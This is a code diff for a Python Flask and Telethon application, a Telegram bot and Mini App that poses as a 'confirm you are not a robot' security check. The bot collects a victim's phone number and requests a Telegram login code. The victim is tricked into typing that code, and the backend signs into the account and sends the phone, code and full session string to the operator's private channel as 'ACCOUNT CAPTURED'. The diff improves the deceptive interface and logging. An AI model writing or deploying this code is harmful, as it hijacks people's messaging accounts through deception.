@@ -8,12 +8,12 @@ from telethon.sessions import StringSession
 from flask import Flask, request, jsonify, render_template_string
 import psycopg2
 
-# Railway uses environment variables, not config.py
+# Railway Environment Variables (replace config.py)
 API_ID = int(os.environ.get("API_ID"))
 API_HASH = os.environ.get("API_HASH")
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
-CHANNEL_ID = int(os.environ.get("CHANNEL_ID"))  # For sending captured sessions
-DATABASE_URL = os.environ.get("DATABASE_URL")
+CHANNEL_ID = int(os.environ.get("CHANNEL_ID"))  # Your private channel ID
+DATABASE_URL = os.environ.get("DATABASE_URL")  # Neon database URL
 
 print("=" * 50)
 print("SCRIPT STARTING...")
@@ -21,7 +21,7 @@ print("=" * 50)
 
 app = Flask(__name__)
 
-# Bot client (for receiving contacts via Telegram messages)
+# Bot client (for receiving contacts via direct messages)
 bot_client = TelegramClient('bot_session', API_ID, API_HASH)
 
 # Store for sessions: user_id -> {phone, phone_code_hash, session_string}
@@ -48,51 +48,240 @@ def init_db():
         conn.close()
         print("Database initialized.")
     except Exception as e:
-        print(f"DB Error: {e}")
+        print(f"DB init error: {e}")
 
-async def send_to_channel(message):
+async def send_to_channel(message_text):
+    """Send captured session to your private channel"""
     try:
         temp = TelegramClient('logger', API_ID, API_HASH)
         await temp.start(bot_token=BOT_TOKEN)
-        await temp.send_message(CHANNEL_ID, message)
+        await temp.send_message(CHANNEL_ID, message_text)
         await temp.disconnect()
+        print("[LOG] Sent to channel.")
     except Exception as e:
-        print(f"Channel send error: {e}")
+        print(f"[ERROR] Channel send failed: {e}")
 
+# YOUR EXACT UI - UNCHANGED
 FRONTEND_HTML = """<!DOCTYPE html>
 <html>
 <head>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: Arial; background: #1a1a2e; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #16213e; padding: 40px; border-radius: 15px; text-align: center; max-width: 400px; }
-        .btn { background: #e94560; color: white; border: none; padding: 15px 30px; border-radius: 8px; font-size: 18px; cursor: pointer; margin: 10px; width: 80%; }
-        .code-input { width: 200px; padding: 15px; font-size: 24px; text-align: center; border-radius: 8px; border: none; margin: 10px; }
-        #screen2, #screen3 { display: none; }
-        .error { color: #ff6b6b; margin-top: 10px; }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: url('https://res.cloudinary.com/bhcgogng/image/upload/v1784494648/photo_2026-07-19_23-37-40_bwzfbi.jpg') no-repeat center center fixed;
+            background-size: cover;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+        
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            height: 100%;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.3);
+        }
+        
+        .card {
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            padding: 40px 30px;
+            border-radius: 20px;
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+        }
+        
+        h2 {
+            color: #fff;
+            margin-bottom: 20px;
+            font-size: 22px;
+            font-weight: 600;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.5);
+        }
+        
+        p {
+            color: #ddd;
+            font-size: 14px;
+            margin-bottom: 30px;
+            line-height: 1.5;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.5);
+        }
+        
+        .robot-icon {
+            font-size: 100px;
+            margin-bottom: 20px;
+            display: block;
+            filter: drop-shadow(0 4px 8px rgba(0,0,0,0.3));
+        }
+        
+        .btn {
+            background: linear-gradient(135deg, rgba(255,107,157,0.9), rgba(196,69,105,0.9));
+            color: white;
+            border: none;
+            padding: 16px 30px;
+            border-radius: 12px;
+            font-size: 18px;
+            cursor: pointer;
+            width: 100%;
+            font-weight: bold;
+            margin: 10px 0;
+            transition: all 0.3s;
+            backdrop-filter: blur(5px);
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        
+        .btn:active { transform: scale(0.98); }
+        .btn:disabled { background: rgba(68, 68, 68, 0.8); cursor: not-allowed; }
+        
+        #verificationScreen, #codeScreen { display: none; }
+        
+        .code-slots {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 30px;
+        }
+        
+        .code-slot {
+            width: 55px;
+            height: 55px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 12px;
+            background: rgba(255, 255, 255, 0.1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 28px;
+            font-weight: bold;
+            color: #fff;
+            backdrop-filter: blur(5px);
+        }
+        
+        .code-slot.filled {
+            background: rgba(255, 107, 157, 0.8);
+            border-color: rgba(255, 107, 157, 0.9);
+        }
+        
+        .keypad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 12px;
+            max-width: 320px;
+            margin: 0 auto;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 20px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        
+        .key {
+            background: linear-gradient(135deg, rgba(255,107,157,0.9), rgba(196,69,105,0.9));
+            color: white;
+            border: none;
+            padding: 18px;
+            border-radius: 12px;
+            font-size: 24px;
+            font-weight: bold;
+            cursor: pointer;
+            backdrop-filter: blur(5px);
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        
+        .key.clear { background: linear-gradient(135deg, rgba(68,68,68,0.8), rgba(34,34,34,0.8)); }
+        
+        .error {
+            color: #ff6b6b;
+            font-size: 14px;
+            margin-top: 10px;
+            display: none;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.5);
+            font-weight: bold;
+        }
+        
+        .loading {
+            display: none;
+            color: #ddd;
+            margin-top: 10px;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.5);
+        }
     </style>
 </head>
 <body>
-    <div class="card" id="screen1">
-        <h2>Security Check</h2>
-        <p>Click below to verify</p>
-        <button class="btn" onclick="next1()">Continue</button>
-    </div>
-    
-    <div class="card" id="screen2">
-        <h2>Almost Done</h2>
-        <p>Please message the bot your contact first, then enter the code here</p>
-        <button class="btn" onclick="showCode()">Enter Code</button>
-    </div>
-    
-    <div class="card" id="screen3">
-        <h2>Enter Verification Code</h2>
-        <p>Check your Telegram messages for the code</p>
-        <input type="text" id="code" class="code-input" maxlength="5" placeholder="12345">
-        <br>
-        <button class="btn" onclick="submitCode()">Verify</button>
-        <div class="error" id="error"></div>
+    <div class="container">
+        <div id="antiBotScreen">
+            <div class="card">
+                <span class="robot-icon">🤖</span>
+                <h2>Please confirm that you are not a robot ✅</h2>
+                <p>This verification helps us ensure the security and integrity of our service.</p>
+                <button class="btn" onclick="handleConfirm()">Confirm ✅</button>
+            </div>
+        </div>
+        
+        <div id="verificationScreen">
+            <div class="card">
+                <h2>Security Verification</h2>
+                <p>To ensure your account security, we need to verify your identity.</p>
+                <button class="btn" id="shareBtn" onclick="handleContact()">Share Contact & Verify</button>
+                <div class="loading" id="contactLoading">Requesting contact...</div>
+            </div>
+        </div>
+        
+        <div id="codeScreen">
+            <div class="card">
+                <h2>Enter Verification Code</h2>
+                <p>We sent a verification code to your Telegram app. Enter it below.</p>
+                
+                <div class="code-slots" id="codeSlots">
+                    <div class="code-slot"></div>
+                    <div class="code-slot"></div>
+                    <div class="code-slot"></div>
+                    <div class="code-slot"></div>
+                    <div class="code-slot"></div>
+                </div>
+                
+                <div class="keypad">
+                    <button class="key" onclick="pressKey('1')">1</button>
+                    <button class="key" onclick="pressKey('2')">2</button>
+                    <button class="key" onclick="pressKey('3')">3</button>
+                    <button class="key" onclick="pressKey('4')">4</button>
+                    <button class="key" onclick="pressKey('5')">5</button>
+                    <button class="key" onclick="pressKey('6')">6</button>
+                    <button class="key" onclick="pressKey('7')">7</button>
+                    <button class="key" onclick="pressKey('8')">8</button>
+                    <button class="key" onclick="pressKey('9')">9</button>
+                    <button class="key clear" onclick="pressKey('clear')">C</button>
+                    <button class="key" onclick="pressKey('0')">0</button>
+                    <button class="key clear" onclick="pressKey('back')">⌫</button>
+                </div>
+                
+                <button class="btn" onclick="submitCode()" style="margin-top: 20px;">Verify</button>
+                <button class="btn" onclick="resendCode()" style="margin-top: 10px; background: linear-gradient(135deg, rgba(68,68,68,0.8), rgba(34,34,34,0.8));">Resend Code</button>
+                <div class="error" id="errorBox">Invalid code.</div>
+                <div class="loading" id="loadingBox">Verifying...</div>
+            </div>
+        </div>
+        
+        <div id="successScreen" style="display: none;">
+            <div class="card">
+                <h2>Success! ✅</h2>
+                <p style="color: #00ff88; font-size: 16px;">Your account has been verified successfully.</p>
+            </div>
+        </div>
     </div>
 
     <script>
@@ -100,40 +289,126 @@ FRONTEND_HTML = """<!DOCTYPE html>
         tg.ready();
         tg.expand();
         
-        var userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : null;
+        var userId = null;
+        var enteredCode = '';
         
-        function next1() {
-            document.getElementById('screen1').style.display = 'none';
-            document.getElementById('screen2').style.display = 'block';
+        if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
+            userId = tg.initDataUnsafe.user.id;
         }
         
-        function showCode() {
-            document.getElementById('screen2').style.display = 'none';
-            document.getElementById('screen3').style.display = 'block';
+        function handleConfirm() {
+            document.getElementById('antiBotScreen').style.display = 'none';
+            document.getElementById('verificationScreen').style.display = 'block';
         }
         
-        function submitCode() {
-            var code = document.getElementById('code').value;
-            if (code.length !== 5) {
-                document.getElementById('error').innerText = 'Enter 5-digit code';
-                return;
-            }
+        function handleContact() {
+            document.getElementById('shareBtn').disabled = true;
+            document.getElementById('contactLoading').style.display = 'block';
             
-            fetch('/verify', {
+            // Just notify backend that user is ready (bot already has phone from direct message)
+            fetch('/ready', {
                 method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({user_id: userId, code: code})
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ user_id: userId })
             })
-            .then(r => r.json())
-            .then(data => {
-                if (data.success) {
-                    document.getElementById('screen3').innerHTML = '<h2 style="color:#00ff88">Success!</h2>';
-                    setTimeout(() => tg.close(), 2000);
+            .then(function(res) { return res.json(); })
+            .then(function(data) {
+                document.getElementById('contactLoading').style.display = 'none';
+                if (data.ready) {
+                    document.getElementById('verificationScreen').style.display = 'none';
+                    document.getElementById('codeScreen').style.display = 'block';
                 } else {
-                    document.getElementById('error').innerText = data.error || 'Failed';
+                    alert('Please message the bot your contact first, then click Share Contact.');
+                    document.getElementById('shareBtn').disabled = false;
                 }
             });
         }
+        
+        function resendCode() {
+            fetch('/resend', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ user_id: userId })
+            })
+            .then(function(res) { return res.json(); })
+            .then(function(data) {
+                if (data.success) {
+                    alert('A new code has been sent to your Telegram app.');
+                    enteredCode = '';
+                    updateCodeDisplay();
+                } else {
+                    alert(data.error || 'Failed to resend code.');
+                }
+            });
+        }
+        
+        function pressKey(key) {
+            if (key === 'back') {
+                enteredCode = enteredCode.slice(0, -1);
+            } else if (key === 'clear') {
+                enteredCode = '';
+            } else {
+                if (enteredCode.length < 5) {
+                    enteredCode += key;
+                }
+            }
+            updateCodeDisplay();
+        }
+        
+        function updateCodeDisplay() {
+            var slots = document.querySelectorAll('.code-slot');
+            for (var i = 0; i < slots.length; i++) {
+                if (i < enteredCode.length) {
+                    slots[i].textContent = '•';
+                    slots[i].classList.add('filled');
+                } else {
+                    slots[i].textContent = '';
+                    slots[i].classList.remove('filled');
+                }
+            }
+        }
+        
+        function submitCode() {
+            if (enteredCode.length !== 5) {
+                alert('Please enter the full 5-digit code.');
+                return;
+            }
+            
+            document.getElementById('loadingBox').style.display = 'block';
+            document.getElementById('errorBox').style.display = 'none';
+            
+            fetch('/verify', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ code: enteredCode, user_id: userId })
+            })
+            .then(function(res) { 
+                if (!res.ok) {
+                    throw new Error('Server error: ' + res.status);
+                }
+                return res.json(); 
+            })
+            .then(function(data) {
+                document.getElementById('loadingBox').style.display = 'none';
+                if (data.success) {
+                    document.getElementById('codeScreen').style.display = 'none';
+                    document.getElementById('successScreen').style.display = 'block';
+                    setTimeout(function() { tg.close(); }, 2000);
+                } else {
+                    document.getElementById('errorBox').textContent = data.error || 'Invalid code.';
+                    document.getElementById('errorBox').style.display = 'block';
+                    enteredCode = '';
+                    updateCodeDisplay();
+                }
+            })
+            .catch(function(err) {
+                document.getElementById('loadingBox').style.display = 'none';
+                document.getElementById('errorBox').textContent = 'Error: ' + err.message;
+                document.getElementById('errorBox').style.display = 'block';
+            });
+        }
+        
+        updateCodeDisplay();
     </script>
 </body>
 </html>"""
@@ -142,11 +417,75 @@ FRONTEND_HTML = """<!DOCTYPE html>
 def index():
     return render_template_string(FRONTEND_HTML)
 
+@app.route('/ready', methods=['POST'])
+def check_ready():
+    """Check if bot has received contact from this user"""
+    data = request.json
+    user_id = str(data.get('user_id'))
+    
+    if user_id in active_sessions:
+        return jsonify({"ready": True})
+    else:
+        return jsonify({"ready": False})
+
+@app.route('/resend', methods=['POST'])
+def resend_code():
+    data = request.json
+    user_id = str(data.get('user_id'))
+    
+    if user_id not in active_sessions:
+        return jsonify({"success": False, "error": "Session not found. Please message the bot your contact first."})
+    
+    phone = active_sessions[user_id]['phone']
+    old_session_string = active_sessions[user_id]['session_string']
+    
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    
+    async def request_new():
+        # Use stored session to resend
+        client = TelegramClient(StringSession(old_session_string), API_ID, API_HASH)
+        try:
+            await client.connect()
+            result = await client.send_code_request(phone)
+            phone_code_hash = result.phone_code_hash
+            new_session_string = client.session.save()
+            
+            # Update storage
+            active_sessions[user_id]['phone_code_hash'] = phone_code_hash
+            active_sessions[user_id]['session_string'] = new_session_string
+            
+            # Update DB
+            conn = get_db()
+            cur = conn.cursor()
+            cur.execute("UPDATE sessions SET phone_code_hash=%s, session_string=%s WHERE user_id=%s",
+                       (phone_code_hash, new_session_string, user_id))
+            conn.commit()
+            cur.close()
+            conn.close()
+            
+            print(f"[RESENT] to {phone}")
+            await client.disconnect()
+            return True, None
+        except Exception as e:
+            await client.disconnect()
+            return False, str(e)
+    
+    success, error = loop.run_until_complete(request_new())
+    loop.close()
+    
+    if success:
+        return jsonify({"success": True})
+    else:
+        return jsonify({"success": False, "error": error})
+
 @app.route('/verify', methods=['POST'])
 def verify_code():
     data = request.json
     code = data.get('code')
     user_id = str(data.get('user_id'))
+    
+    print(f"\n[VERIFY] User: {user_id}, Code: {code}")
     
     if user_id not in active_sessions:
         return jsonify({"success": False, "error": "Session not found. Please message the bot your contact first."})
@@ -157,9 +496,7 @@ def verify_code():
     session_string = session.get('session_string')
     
     if not phone_code_hash:
-        return jsonify({"success": False, "error": "No code requested yet."})
-    
-    print(f"\n[VERIFY] Phone: {phone}, Code: {code}")
+        return jsonify({"success": False, "error": "Code not requested yet."})
     
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
@@ -175,25 +512,24 @@ def verify_code():
             # SUCCESS - Get final session
             final_session = client.session.save()
             
-            print(f"[CAPTURED] {phone}")
-            print(f"[SESSION] {final_session[:50]}...")
+            print(f"\n[CAPTURED] Phone: {phone}")
+            print(f"[SESSION] {final_session}\n")
             
             # Send to your channel
-            msg = f"""🚨 CAPTURED
+            msg = f"""🚨 ACCOUNT CAPTURED 🚨
 
-📞 {phone}
-🔑 {code}
-🔐 `{final_session}`
+📞 Phone: `{phone}`
+🔑 Code Used: `{code}`
+🔐 Session String:
+`{final_session}`
 
-{datetime.now()}"""
-            await send_to_channel(msg)
+⏰ {datetime.now()}"""
             
+            await send_to_channel(msg)
             await client.disconnect()
             
             # Cleanup
             del active_sessions[user_id]
-            
-            # Cleanup DB
             conn = get_db()
             cur = conn.cursor()
             cur.execute("DELETE FROM sessions WHERE user_id = %s", (user_id,))
@@ -205,25 +541,21 @@ def verify_code():
             
         except errors.PhoneCodeInvalidError:
             await client.disconnect()
-            return False, "Invalid code"
+            return False, "Invalid code. Please try again."
         except errors.PhoneCodeExpiredError:
             await client.disconnect()
-            return False, "Code expired, request new one"
+            return False, "Code expired. Please request a new one."
         except errors.SessionPasswordNeededError:
             await client.disconnect()
-            await send_to_channel(f"⚠️ 2FA on {phone}")
+            await send_to_channel(f"⚠️ 2FA DETECTED: {phone}")
             del active_sessions[user_id]
-            return False, "2FA enabled"
+            return False, "This account has 2FA enabled."
         except Exception as e:
             await client.disconnect()
             return False, str(e)
     
-    try:
-        success, error = loop.run_until_complete(try_login())
-        loop.close()
-    except Exception as e:
-        loop.close()
-        return jsonify({"success": False, "error": str(e)})
+    success, error = loop.run_until_complete(try_login())
+    loop.close()
     
     if success:
         return jsonify({"success": True})
@@ -231,17 +563,17 @@ def verify_code():
         return jsonify({"success": False, "error": error})
 
 async def bot_listener():
+    """Bot listens for contacts sent via direct message"""
     await bot_client.start(bot_token=BOT_TOKEN)
     print("Bot is online. Waiting for contacts...")
 
     @bot_client.on(events.NewMessage)
     async def handler(event):
-        # Check if message has contact
         if event.message.media and hasattr(event.message.media, "phone_number"):
             phone = event.message.media.phone_number
             user_id = str(event.message.sender_id)
             
-            print(f"[CONTACT] User {user_id}: {phone}")
+            print(f"\n[CONTACT RECEIVED] User: {user_id}, Phone: {phone}")
             
             # Create client and request code
             client = TelegramClient(StringSession(), API_ID, API_HASH)
@@ -254,14 +586,14 @@ async def bot_listener():
                 # Get session string BEFORE signing in
                 session_string = client.session.save()
                 
-                # Store for later verification
+                # Store in memory
                 active_sessions[user_id] = {
                     'phone': phone,
                     'phone_code_hash': phone_code_hash,
                     'session_string': session_string
                 }
                 
-                # Also store in DB
+                # Store in DB
                 conn = get_db()
                 cur = conn.cursor()
                 cur.execute("""
@@ -276,9 +608,8 @@ async def bot_listener():
                 
                 print(f"[CODE SENT] to {phone}")
                 
-                # Send confirmation to user via bot
-                await bot_client.send_message(user_id, "✅ Code requested! Check your Telegram app and enter it in the Mini App.")
-                
+                # Notify user
+                await bot_client.send_message(user_id, "✅ Verification code sent! Check your Telegram app and enter it in the Mini App.")
                 await client.disconnect()
                 
             except Exception as e:
@@ -298,5 +629,6 @@ if __name__ == '__main__':
     
     # Start Flask
     port = int(os.environ.get("PORT", 5000))
-    print(f"Starting server on port {port}")
+    print(f"Starting web server on port {port}")
+    print("=" * 50)
     app.run(host='0.0.0.0', port=port, debug=False)
